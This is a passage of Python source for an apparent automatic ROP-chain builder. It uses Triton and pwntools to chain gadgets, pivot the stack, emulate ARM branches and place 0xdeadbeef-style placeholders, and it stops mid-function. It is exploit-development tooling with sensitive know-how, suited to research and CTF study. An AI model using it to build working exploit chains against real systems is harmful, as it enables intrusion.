from triton import TritonContext, ARCH, MemoryAccess, CPUSIZE, Instruction
from pwn import *
import json
import copy
import tools
import arch_config
from loguru import logger

def _get_ac():
    return arch_config.get_arch()

def _set_pwn_context():
    ac = _get_ac()
    context.arch = ac.pwn_arch

_set_pwn_context()

def _p(value):
    """Pack pointer-sized value based on current arch."""
    ac = _get_ac()
    return ac.p(value)

def _ptr_size():
    return _get_ac().ptr_size

def _addr_mask():
    return _get_ac().addr_mask

def _addr_hex(addr):
    return _get_ac().addr_hex(addr)

def _cpusize():
    return _get_ac().get_cpusize()

def _deadbe_addr(offset):
    """Generate 0xdeadbe00+offset placeholder address. ARM needs even values (bit 0 clear)."""
    if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
        return 0xdeadbe00 + offset * 2
    return 0xdeadbe00 + offset

def _triton_supported():
    return _get_ac().triton_supported

def _create_triton_ctx():
    """Create and configure a TritonContext for the current arch. Returns None if unsupported (MIPS)."""
    ac = _get_ac()
    if not ac.triton_supported:
        return None
    ctx = TritonContext()
    ctx.setArchitecture(ac.triton_arch)
    # Always use ARM mode for Triton (even for Thumb gadgets) because Triton's
    # Thumb support is very limited. We use ARM-mode encoding via my_asm_for_triton().
    return ctx

def _reset_thumb(ctx):
    """Reset Triton thumb state. Always ARM mode since we use ARM encoding for Triton."""
    ac = _get_ac()
    if ac.arch_name in ('arm', 'armel', 'arm32'):
        ctx.setThumb(False)

_ARM_BRANCH_OPS = frozenset(['b', 'bl', 'bne', 'beq', 'bgt', 'blt', 'bge', 'ble', 'bhi', 'bls', 'bcc', 'bcs', 'bpl', 'bmi'])

def _skip_arm_imm_branch(ctx, address, code, is_last_inst):
    """Skip bl/b/bXX #imm in middle of ARM gadgets. Returns True if skipped."""
    if _get_ac().arch_name not in ('arm', 'armel', 'arm32') or is_last_inst:
        return False
    op0 = code.strip().split()[0]
    if op0 not in _ARM_BRANCH_OPS or '#' not in code:
        return False
    try:
        asm_len = len(tools.my_asm(code))
    except:
        asm_len = 4
    if op0 == 'bl':
        ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + asm_len)
    ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), address + asm_len)
    return True

def _process_instruction_arm_safe(ctx, address, code):
    """Process an instruction with ARM-safe fallback: if pop {pc}/blx/bx fails, manually simulate."""
    try:
        instruction = Instruction(address, tools.my_asm_for_triton(code))
        ctx.processing(instruction)
        return instruction
    except:
        if _get_ac().arch_name in ('arm', 'armel', 'arm32'):
            op0 = code.strip().split()[0]
            if op0 in ('blx', 'bx'):
                branch_reg = code.strip().split()[-1]
                target_val = ctx.getConcreteRegisterValue(get_reg(ctx, branch_reg))
                ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), target_val & ~1)
                if op0 == 'blx':
                    ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + len(tools.my_asm(code)))
                return None
            if op0 == 'bl':
                # bl #imm: in ROPgadget output, the called function returns.
                # Skip the branch — just set LR and continue to next instruction.
                try:
                    asm_len = len(tools.my_asm(code))
                except:
                    asm_len = 4
                ctx.setConcreteRegisterValue(get_reg(ctx, 'r14'), address + asm_len)
                ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), address + asm_len)
                return None
            if op0 in ('b', 'bne', 'beq', 'bgt', 'blt', 'bge', 'ble', 'bhi', 'bls', 'bcc', 'bcs', 'bpl', 'bmi') and '#' in code:
                # Conditional/unconditional branch to immediate in ROPgadget output:
                # the branch is not taken (gadget continues to next instruction).
                try:
                    asm_len = len(tools.my_asm(code))
                except:
                    asm_len = 4
                ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().pc_reg), address + asm_len)
                return None
            op_info = tools.Analysis_op_dispatch(code)
            if type(op_info) == list:
                # pop {r3, r4, ..., pc} - simulate each pop
                sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                for item in op_info:
                    reg_name = item['dst']['reg_name']
                    mem_val = ctx.getConcreteMemoryValue(MemoryAccess(sp_val, _cpusize()))
                    if reg_name == 'pc':
                        # Clear bit 0 for ARM mode
                        ctx.setConcreteRegisterValue(get_reg(ctx, reg_name), mem_val & ~1)
                    elif get_reg(ctx, reg_name) is not None:
                        ctx.setConcreteRegisterValue(get_reg(ctx, reg_name), mem_val)
                    sp_val += _ptr_size()
                ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val)
            else:
                # Single pop or other instruction
                sp_val = ctx.getConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg))
                if op_info and op_info['op'] == 'pop':
                    mem_val = ctx.getConcreteMemoryValue(MemoryAccess(sp_val, _cpusize()))
                    reg_name = op_info['dst']['reg_name']
                    if reg_name == 'pc':
                        ctx.setConcreteRegisterValue(get_reg(ctx, reg_name), mem_val & ~1)
                    elif get_reg(ctx, reg_name) is not None:
                        ctx.setConcreteRegisterValue(get_reg(ctx, reg_name), mem_val)
                    ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + _ptr_size())
                else:
                    ctx.setConcreteRegisterValue(get_reg(ctx, _get_ac().sp_reg), sp_val + _ptr_size())
            return None
        else:
            raise

def init_reg(ctx, regs):
    ac = _get_ac()
    for reg, v in regs.items():
        if reg not in ac.skip_regs:
            r = get_reg(ctx, reg)
            if r is not None:
                ctx.setConcreteRegisterValue(r, v)
    return ctx
def get_reg(ctx, reg_name):
    # ARM Triton uses 'r14' instead of 'lr'
    _triton_reg_aliases = {
        'lr': 'r14',
        'fp': 'r11',
    }
    triton_name = _triton_reg_aliases.get(reg_name, reg_name)
    for reg in ctx.getAllRegisters():
        if reg.getName() == triton_name:
            return reg
        if reg.getName() == reg_name:
            return reg
    return None
def controllable_mem_distributor(gadgets_info,address_map,now_gadget,mem_type):
    # 内存分配器，对可控内存进行统一管理
    if mem_type == "rip_mem":
        (my_virtual_mem_start, my_virtual_mem_length) = gadgets_info.my_virtual_mem_info
        for mem_addr in range(my_virtual_mem_start,my_virtual_mem_start+my_virtual_mem_length,_ptr_size()):
            if mem_addr not in gadgets_info.used_virtual_mem:
                return mem_addr
    elif mem_type == "valid_mem":
        valid_bss_addr = gadgets_info.bss_address
        return valid_bss_addr
def jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
    jmp_stack_need = False
    offset_list = gadgets_info.offset_list
    for idx, data in solve.items():
        if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size(): # 虚拟内存中的
            continue
        else:
            if start_idx+idx-now_idx not in offset_list:
                jmp_stack_need = True
                break
    return jmp_stack_need

def jmp_stack(start_idx, merge_address_map, gadgets_info):
    offset_list = gadgets_info.offset_list.copy()
    change_sp_gadget = gadgets_info.change_sp_gadget
    target_regs = [_['reg_name'] for _ in gadgets_info.target_regs]
    while(True):
        if start_idx in offset_list and start_idx+1 in offset_list:
            front_idx = my_max(gadgets_info, merge_address_map)
            if merge_address_map[front_idx] not in gadgets_info.gadgets_dict:
                merge_address_map[start_idx] = gadgets_info.ret_gadget['addr']
            elif "retf" == gadgets_info.gadgets_dict[merge_address_map[front_idx]].split(" ; ")[-1]:
                cs = gadgets_info.regs_init.get('cs', 0)
                merge_address_map[start_idx] = f"{"0x"+hex((eval(gadgets_info.ret_gadget['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
            else:
                merge_address_map[start_idx] = gadgets_info.ret_gadget['addr']
            offset_list.pop(offset_list.index(start_idx))
            start_idx += 1
        else:
            break
    for sp_gg_idx in range(len(change_sp_gadget)):
        if len(set(change_sp_gadget[sp_gg_idx]['side_affect'])&set(target_regs)) == 0 and 'rsp' not in change_sp_gadget[sp_gg_idx]['side_affect']:
            if change_sp_gadget[sp_gg_idx]['change']//8 + start_idx in offset_list and change_sp_gadget[sp_gg_idx]['change']//8 + start_idx > start_idx:
                front_idx = my_max(gadgets_info, merge_address_map)
                if merge_address_map[front_idx] not in gadgets_info.gadgets_dict:
                    merge_address_map[start_idx] = change_sp_gadget[sp_gg_idx]['addr']
                elif "retf" == gadgets_info.gadgets_dict[merge_address_map[front_idx]].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    merge_address_map[start_idx] = f"{"0x"+hex((eval(change_sp_gadget[sp_gg_idx]['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    merge_address_map[start_idx] = change_sp_gadget[sp_gg_idx]['addr']
                offset_list.pop(offset_list.index(start_idx))
                start_idx += change_sp_gadget[sp_gg_idx]['change']//8
                break
    gadgets_info.offset_list = offset_list
    return (start_idx, merge_address_map, gadgets_info)

def jmp_stack_after_pivot(address_map, gadgets_info, offset_list, pivot_gadget):
    for i,v in address_map.items():
        if v == '0xdeadbeef':
            rip_idx = i
            del address_map[i]
            break
    offset_list.append(rip_idx)
    last_pivot_addr = pivot_gadget[-1].split(" -> ")[0]
    # 先用ret来补充前面的
    while(True):
        if rip_idx in offset_list and rip_idx+1 in offset_list:
            if "retf" == gadgets_info.gadgets_dict[last_pivot_addr].split(" ; ")[-1]:
                cs = gadgets_info.regs_init.get('cs', 0)
                address_map[rip_idx] = f"{"0x"+hex((eval(gadgets_info.ret_gadget['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
            else:
                address_map[rip_idx] = gadgets_info.ret_gadget['addr']
            offset_list.pop(offset_list.index(rip_idx))
            rip_idx += 1
            pivot_gadget.append(f"{gadgets_info.ret_gadget['addr']} -> {gadgets_info.ret_gadget['gadget']}")
        else:
            break
    
    change_sp_gadget = gadgets_info.change_sp_gadget
    for sp_gg_idx in range(len(change_sp_gadget)):
        if 'rsp' not in change_sp_gadget[sp_gg_idx]['side_affect']:
            if change_sp_gadget[sp_gg_idx]['change']//8 + rip_idx in offset_list and change_sp_gadget[sp_gg_idx]['change']//8 + rip_idx != rip_idx:
                if len(address_map) != 0:
                    front_idx = my_max(gadgets_info, address_map)
                    last_pivot_addr = address_map[front_idx]
                if last_pivot_addr not in gadgets_info.gadgets_dict:
                    address_map[rip_idx] = change_sp_gadget[sp_gg_idx]['addr']
                elif "retf" == gadgets_info.gadgets_dict[last_pivot_addr].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    address_map[rip_idx] = f"{"0x"+hex((eval(change_sp_gadget[sp_gg_idx]['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    address_map[rip_idx] = change_sp_gadget[sp_gg_idx]['addr']
                offset_list.pop(offset_list.index(rip_idx))
                rip_idx += change_sp_gadget[sp_gg_idx]['change']//8
                pivot_gadget.append(f"{change_sp_gadget[sp_gg_idx]['addr']} -> {change_sp_gadget[sp_gg_idx]['gadget']}")
                break
    address_map[rip_idx] = '0xdeadbeef'
    offset_list.pop(offset_list.index(rip_idx))
    return address_map, offset_list, pivot_gadget

def solve(gadget_chain,gadgets_info):
    gadgets_info_copy = copy.deepcopy(gadgets_info)
    target_regs_bak = gadgets_info_copy.target_regs
    gadget_chain_part = []

    # for k0 in range(len(gadget_chain)):
    #     for k1 in range(len(gadget_chain[k0])):
    #         g_i = tools.Analysis_gadget_dispatch(gadget_chain[k0][k1])['can_change_regs']
    #         for k3 in range(len(g_i)):
    #             if g_i[k3]['src_reg'] == 'rsp' and g_i[k3]['src_reg_type'] == 'value':
    # 按照jmp/call将gadget分段
    tmp = []
    for i in range(len(gadget_chain)):
        for j in range(len(gadget_chain[i])):
            last_inst = gadgets_info_copy.gadgets_dict[gadget_chain[i][j]].split(" ; ")[-1]
            last_op = last_inst.strip().split()[0] if last_inst.strip() else ""
            if "call" in last_inst or "jmp" in last_inst or last_op in ("blx", "bx") or "leave ; ret" in gadgets_info_copy.gadgets_dict[gadget_chain[i][j]]:
                tmp.append(gadget_chain[i][j])
                if tmp not in gadget_chain_part:
                    gadget_chain_part.append(tmp)
                tmp = []
            else:
                tmp.append(gadget_chain[i][j])
        if len(tmp) != 0:
            if tmp not in gadget_chain_part:
                gadget_chain_part.append(tmp)
            tmp = []

    # for i in range(len(gadget_chain)):
    #     for j in range(len(gadget_chain[i])):
    #         gadget_chain_part.append([gadget_chain[i][j]])

    solve_res = []
    constraint = []
    used_virtual_mem = []
    for i0 in range(len(gadget_chain_part),0,-1):
        next_addr = hex(_deadbe_addr(i0 - 1))
        used_virtual_mem.append(gadgets_info_copy.used_virtual_mem.copy())
        res = solve_part(gadget_chain_part[i0-1]+[next_addr],gadgets_info_copy,[])
        if not res:
            gadgets_info_copy.target_regs = target_regs_bak
            return False
        (address_map,solve_constraint) = res
        regs_state = get_regs_state(gadgets_info, address_map, 1)
        if type(regs_state)!=dict:
            return False
        rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
        if 'call' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]:
            if rsp_idx_now < my_max(gadgets_info_copy, address_map):
                return False
        else:
            if rsp_idx_now <= my_max(gadgets_info_copy, address_map):
                return False
        f = True
        for i,v in address_map.items():
            if v == next_addr:
                f = False
                break
        if f:
            if  'call' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]:
                only_pop_gadget = gadgets_info.only_pop_gadget
                target_regs = [_['reg_name'] for _ in gadgets_info.target_regs]
                for i1 in range(len(only_pop_gadget)):
                    if len(set(only_pop_gadget[i1]['pop_regs'])&set(target_regs)) == 0 and len(only_pop_gadget[i1]['pop_regs']) == 1:
                        pop_gadget_addr = only_pop_gadget[i1]['addr']
                        break
                res = solve_part(gadget_chain_part[i0-1]+[pop_gadget_addr],gadgets_info_copy,[])
                if not res:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                (address_map,solve_constraint) = res
        
                regs_state = get_regs_state(gadgets_info, address_map, 1)
                if type(regs_state) != dict and not regs_state[0]:
                    return False
                rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
                address_map[rsp_idx_now+1] = next_addr
            else:
                if gadgets_info_copy.ret_gadget is None:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                res = solve_part(gadget_chain_part[i0-1]+[gadgets_info_copy.ret_gadget['addr']],gadgets_info_copy,[])
                if not res:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                (address_map,solve_constraint) = res

                regs_state = get_regs_state(gadgets_info, address_map, 1)
                if type(regs_state) != dict and not regs_state[0]:
                    return False
                rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
                address_map[rsp_idx_now-1] = next_addr

        solve_res.append(address_map)
        r_t = []
        for r,v in solve_constraint.items():
            r_t.append({"reg_name":r,"reg_value":v})
        gadgets_info_copy.target_regs = r_t
        constraint.append(r_t)
    solve_res = solve_res[::-1]
    constraint = constraint[:-1]
    constraint = constraint[::-1]
    constraint.append(target_regs_bak)
    used_virtual_mem = used_virtual_mem[::-1]
    new_solve_res = []
    regs_state = gadgets_info.regs_init.copy()
    used_virtual_mem_bak = copy.deepcopy(gadgets_info_copy.used_virtual_mem)
    for i0 in range(len(gadget_chain_part)):
        next_addr = hex(_deadbe_addr(i0))
        gadgets_info_copy.regs_init = regs_state
        gadgets_info_copy.target_regs = constraint[i0]
        gadgets_info_copy.used_virtual_mem = used_virtual_mem[i0]
        res = solve_part(gadget_chain_part[i0]+[next_addr],gadgets_info_copy,[])
        # print(res)
        if not res:
            gadgets_info_copy.target_regs = target_regs_bak
            return False
        (address_map,solve_constraint) = res
        regs_state = get_regs_state(gadgets_info, address_map, 1)
        if type(regs_state)!=dict:
            return False
        rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
        if 'call' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]:
            if rsp_idx_now < my_max(gadgets_info_copy, address_map):
                return False
        else:
            if rsp_idx_now <= my_max(gadgets_info_copy, address_map):
                return False
        f = True
        for i,v in address_map.items():
            if v == next_addr:
                f = False
                break
        if f:
            if  'call' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]:
                only_pop_gadget = gadgets_info.only_pop_gadget
                target_regs = [_['reg_name'] for _ in gadgets_info.target_regs]
                for i1 in range(len(only_pop_gadget)):
                    if len(set(only_pop_gadget[i1]['pop_regs'])&set(target_regs)) == 0 and len(only_pop_gadget[i1]['pop_regs']) == 1:
                        pop_gadget_addr = only_pop_gadget[i1]['addr']
                        break
                res = solve_part(gadget_chain_part[i0-1]+[pop_gadget_addr],gadgets_info_copy,[])
                if not res:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                (address_map,solve_constraint) = res
        
                regs_state = get_regs_state(gadgets_info, address_map, 1)
                if type(regs_state) != dict and not regs_state[0]:
                    return False
                rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
                address_map[rsp_idx_now+1] = next_addr
            else:
                if gadgets_info_copy.ret_gadget is None:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                res = solve_part(gadget_chain_part[i0-1]+[gadgets_info_copy.ret_gadget['addr']],gadgets_info_copy,[])
                if not res:
                    gadgets_info_copy.target_regs = target_regs_bak
                    return False
                (address_map,solve_constraint) = res

                regs_state = get_regs_state(gadgets_info, address_map, 1)
                if type(regs_state) != dict and not regs_state[0]:
                    return False
                rsp_idx_now = (regs_state[_get_ac().sp_reg]-gadgets_info.controble_addr_base)//_ptr_size()
                address_map[rsp_idx_now-1] = next_addr

        new_solve_res.append(address_map)
        regs_state = get_regs_state(gadgets_info, address_map, 0)
        # r_t = []
        # for r,v in solve_constraint.items():
        #     r_t.append({"reg_name":r,"reg_value":v})
        # gadgets_info_copy.target_regs = r_t
    # new_solve_res = new_solve_res[::-1]

    gadgets_info_copy.target_regs = target_regs_bak
    merge_gadgets_res = merge_gadgets(gadgets_info_copy,gadget_chain_part,new_solve_res)
    for a,v in merge_gadgets_res.items():
        if v == "0xdeadbee3":
            merge_gadgets_res[a] = "0xdeadbeef"
    
    gadgets_info.used_virtual_mem = used_virtual_mem_bak
    gadgets_info.solve_reg_constraints = solve_constraint if isinstance(solve_constraint, dict) else {}
    return merge_gadgets_res
    
    # solve_res = solve_res_copy
    # gadgets_info_copy.target_regs = []
    # if len(gadget_chain_part) > 1:
    #     regs_state = gadgets_info.regs_init.copy()
    #     for i in range(len(gadget_chain_part)):
    #         gadgets_info_copy.regs_init = regs_state
    #         resolve_control = solve([gadget_chain_part[i]],gadgets_info_copy)
    #         if not resolve_control:
    #             return False
    #         for idx, v in resolve_control.items():
    #             if idx not in solve_res[i]:
    #                 solve_res[i][idx] = v
    #             if solve_res[i][idx] != v and eval(v)&0xffffff00!=0xdeadbe00:
    #                 solve_res[i][idx] = v
    #         regs_state = get_regs_state(gadgets_info_copy,solve_res[i],0)
    #         # print(regs_state)
    # gadgets_info_copy.target_regs = target_regs_bak
    # merge_gadgets_res = merge_gadgets(gadgets_info_copy,gadget_chain_part,solve_res)
    # for a,v in merge_gadgets_res.items():
    #     if v == "0xdeadbee3":
    #         merge_gadgets_res[a] = "0xdeadbeef"
    # # gadgets_info_copy.target_regs = target_regs_bak
    # gadgets_info_copy.regs_init = gadgets_info.regs_init.copy()
    # check_res = check(gadgets_info_copy, merge_gadgets_res)
    # if check_res[0]:
    #     gadgets_info.used_virtual_mem = gadgets_info_copy.used_virtual_mem
    #     return merge_gadgets_res
    # else:
    #     gadgets_info.used_virtual_mem = gadgets_info_copy.used_virtual_mem
    #     return False
def my_max(gadgets_info,address_map):
    my_virtual_mem_start = gadgets_info.my_virtual_mem_info[0]
    tmp = []
    for a,v in address_map.items():
        if a < (my_virtual_mem_start-gadgets_info.controble_addr_base)//_ptr_size():
            if "0x"+hex(eval(v)&0xffffffff)[2:].rjust(_get_ac().addr_format_width,'0') in gadgets_info.gadgets_dict:
                tmp.append(a)
    if len(tmp) == 0:
        for a,v in address_map.items():
            if a < (my_virtual_mem_start-gadgets_info.controble_addr_base)//_ptr_size():
                tmp.append(a)
    return max(tmp)
def update_offset_list(gadgets_info, solve_res):
    offset_list = gadgets_info.offset_list.copy()
    address_map = {}
    for i, v in solve_res.items():
        if i in offset_list:
            offset_list.pop(offset_list.index(i))
        if eval(v)&0xffffff00 == 0xdeadbe00:
            address_map[i] = '0xdeadbeef'
    gadgets_info.offset_list = offset_list
    gadgets_info.address_map = address_map
    return gadgets_info
def need_add_jmp(gadgets_info, solve_res):
    if eval(solve_res[my_max(gadgets_info, solve_res)])&0xffffff00 == 0xdeadbe00:
        return False
    else:
        return True
def merge_gadgets(gadgets_info,gadget_chain_part,solve_res,mode=0):# mode 0:reg 1:mem
    # 由于拼接会导致写入的可控地址发生变化，需要进行调整
    # logger.info("Start Merge Gadget")
    note_mem_idx_before = {}
    offset_list = gadgets_info.offset_list.copy()
    for j0 in range(len(solve_res)):
        for j1,v in solve_res[j0].items():
            if eval(v)-gadgets_info.controble_addr_base >= 0 and eval(v)-gadgets_info.controble_addr_base < 0x100000:
                note_mem_idx_before[eval(v)] = j1
    merge_address_map = solve_res[0]
    for i0 in range(1,len(gadget_chain_part)):
        solve = solve_res[i0]

        next_gadget = gadget_chain_part[i0][0]
        prev_last_gadget = gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]
        prev_last_op = prev_last_gadget.split(" ; ")[-1].strip().split()[0]
        if prev_last_op in ('blx', 'bx'):
            # Register-based control flow (ARM blx/bx): control goes via register, not stack.
            # The placeholder 0xdeadbeXX is in a register-loaded slot (hijack reg loaded by pop).
            # Replace placeholder with actual next gadget address.
            for idx, data in list(merge_address_map.items()):
                if (mode==0 and data == hex(_deadbe_addr(i0-1))) or (mode==1 and eval(data)&0xffffff00 == 0xdeadbe00):
                    merge_address_map[idx] = next_gadget
            # For blx/bx, SP is not modified by the branch itself.
            # SP after the pop gadget = max stack slot used + 1
            start_idx = my_max(gadgets_info, merge_address_map) + 1
            now_idx = min(solve)

            while jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                (start_idx, merge_address_map, gadgets_info) = jmp_stack(start_idx, merge_address_map, gadgets_info)

            for idx, data in solve.items():
                if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                    merge_address_map[idx] = data
                    continue
                # For blx/bx, the gadget address (now_idx) is loaded via register, not stack.
                # Skip the gadget address slot; only copy data slots.
                if idx != now_idx:
                    merge_address_map[start_idx+idx-now_idx-1] = data
        elif 'call' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]] and need_add_jmp(gadgets_info, solve_res[i0-1]):
            # TODO
            only_pop_gadget = gadgets_info.only_pop_gadget
            target_regs = [_['reg_name'] for _ in gadgets_info.target_regs]
            for i1 in range(len(only_pop_gadget)):
                if len(set(only_pop_gadget[i1]['pop_regs'])&set(target_regs)) == 0:
                    pop_gadget_addr = only_pop_gadget[i1]['addr']
                    for idx, data in merge_address_map.items():
                        if (mode==0 and data == hex(_deadbe_addr(i0-1))) or (mode==1 and eval(data)&0xffffff00 == 0xdeadbe00):
                            merge_address_map[idx] = pop_gadget_addr
                    
                    start_idx = my_max(gadgets_info,merge_address_map) + len(only_pop_gadget[i1]['pop_regs'])
                    now_idx = min(solve)

                    while jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                        (start_idx, merge_address_map, gadgets_info) = jmp_stack(start_idx, merge_address_map, gadgets_info)

                    for idx, data in solve.items():
                        if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size(): # 虚拟内存中的
                            merge_address_map[idx] = data
                            continue
                        if idx == now_idx:
                            if "retf" in gadgets_info.gadgets_dict[pop_gadget_addr]:
                                cs = gadgets_info.regs_init.get('cs', 0)
                                merge_address_map[start_idx+idx-now_idx] = f"{hex((eval(next_gadget))|(cs<<32))}"
                            else:
                                merge_address_map[start_idx+idx-now_idx] = next_gadget
                        else:
                            merge_address_map[start_idx+idx-now_idx] = data
                    break
            # 找一个不影响的pop reg ; ret的gadget，来处理call的影响
            pass
        elif "jmp" in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]] and need_add_jmp(gadgets_info, solve_res[i0-1]):
            if gadgets_info.ret_gadget is None:
                return False
            ret_gadget = gadgets_info.ret_gadget['addr']
            for idx, data in merge_address_map.items():
                if (mode==0 and data == hex(_deadbe_addr(i0-1))) or (mode==1 and eval(data)&0xffffff00 == 0xdeadbe00):
                    merge_address_map[idx] = ret_gadget
            
            start_idx = my_max(gadgets_info,merge_address_map)+1
            now_idx = min(solve)
            
            while jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                (start_idx, merge_address_map, gadgets_info) = jmp_stack(start_idx, merge_address_map, gadgets_info)
                
            for idx, data in solve.items():
                if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                    merge_address_map[idx] = data
                    continue
                if idx == now_idx:
                    if "retf" in gadgets_info.gadgets_dict[ret_gadget]:
                        cs = gadgets_info.regs_init.get('cs', 0)
                        merge_address_map[start_idx+idx-now_idx] = f"{hex((eval(next_gadget))|(cs<<32))}"
                    else:
                        merge_address_map[start_idx+idx-now_idx] = next_gadget
                else:
                    merge_address_map[start_idx+idx-now_idx] = data

        elif 'retf' in gadgets_info.gadgets_dict[gadget_chain_part[i0-1][-1]]:
            # 下一条地址前面要加cs寄存器的值
            start_idx = 0
            for idx, data in merge_address_map.items():
                if (mode==0 and data == hex(_deadbe_addr(i0-1))) or (mode==1 and eval(data)&0xffffff00 == 0xdeadbe00):
                    # cs = gadgets_info.regs_init.get('cs', 0)
                    # merge_address_map[idx] = f"{hex((eval(next_gadget))|(cs<<32))}"
                    start_idx = idx
            if start_idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                rsp_idx = (get_regs_state(gadgets_info, merge_address_map,1)['rsp']-gadgets_info.controble_addr_base)//_ptr_size()
                front_idx = my_max(gadgets_info,merge_address_map)
                if "retf" == gadgets_info.gadgets_dict["0x" + hex(eval(merge_address_map[front_idx])&0xffffffff)[2:].rjust(_get_ac().addr_format_width,'0')].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    merge_address_map[start_idx] = f"{"0x"+hex((eval(gadgets_info.ret_gadget['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    merge_address_map[start_idx] = gadgets_info.ret_gadget['addr']
                start_idx = rsp_idx
            now_idx = min(solve)
            if jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                while jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                    (start_idx, merge_address_map, gadgets_info) = jmp_stack(start_idx, merge_address_map, gadgets_info)

                front_idx = my_max(gadgets_info,merge_address_map)
                if "retf" == gadgets_info.gadgets_dict["0x" + hex(eval(merge_address_map[front_idx])&0xffffffff)[2:].rjust(_get_ac().addr_format_width,'0')].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    merge_address_map[start_idx] = f"{"0x"+hex((eval(next_gadget))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    merge_address_map[start_idx] = next_gadget
            else:
                cs = gadgets_info.regs_init.get('cs', 0)
                merge_address_map[start_idx] = f"{"0x"+hex((eval(next_gadget))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
            for idx, data in solve.items():
                if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                    merge_address_map[idx] = data
                    continue
                if idx != now_idx:
                    merge_address_map[start_idx+idx-now_idx] = data
            pass
        else:
            
            start_idx = 0
            for idx, data in merge_address_map.items():
                if (mode==0 and data == hex(_deadbe_addr(i0-1))) or (mode==1 and eval(data)&0xffffff00 == 0xdeadbe00):
                    # merge_address_map[idx] = next_gadget
                    start_idx = idx
            if start_idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                rsp_idx = (get_regs_state(gadgets_info, merge_address_map,1)['rsp']-gadgets_info.controble_addr_base)//_ptr_size()
                front_idx = my_max(gadgets_info,merge_address_map)
                if "retf" == gadgets_info.gadgets_dict["0x" + hex(eval(merge_address_map[front_idx])&0xffffffff)[2:].rjust(_get_ac().addr_format_width,'0')].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    merge_address_map[start_idx] = f"{"0x"+hex((eval(gadgets_info.ret_gadget['addr']))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    merge_address_map[start_idx] = gadgets_info.ret_gadget['addr']
                start_idx = rsp_idx
            now_idx = min(solve)
            if jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                while jmp_stack_need_check(solve, gadgets_info, start_idx, now_idx):
                    (start_idx, merge_address_map, gadgets_info) = jmp_stack(start_idx, merge_address_map, gadgets_info)

                front_idx = my_max(gadgets_info,merge_address_map)
                if "retf" == gadgets_info.gadgets_dict["0x" + hex(eval(merge_address_map[front_idx])&0xffffffff)[2:].rjust(_get_ac().addr_format_width,'0')].split(" ; ")[-1]:
                    cs = gadgets_info.regs_init.get('cs', 0)
                    merge_address_map[start_idx] = f"{"0x"+hex((eval(next_gadget))|(cs<<32))[2:].rjust(_get_ac().addr_format_width,'0')}"
                else:
                    merge_address_map[start_idx] = next_gadget
            else:
                merge_address_map[start_idx] = next_gadget

            for idx, data in solve.items():
                if idx >= (gadgets_info.my_virtual_mem_info[0]-gadgets_info.controble_addr_base)//_ptr_size():
                    merge_address_map[idx] = data
                    continue
                if idx != now_idx:
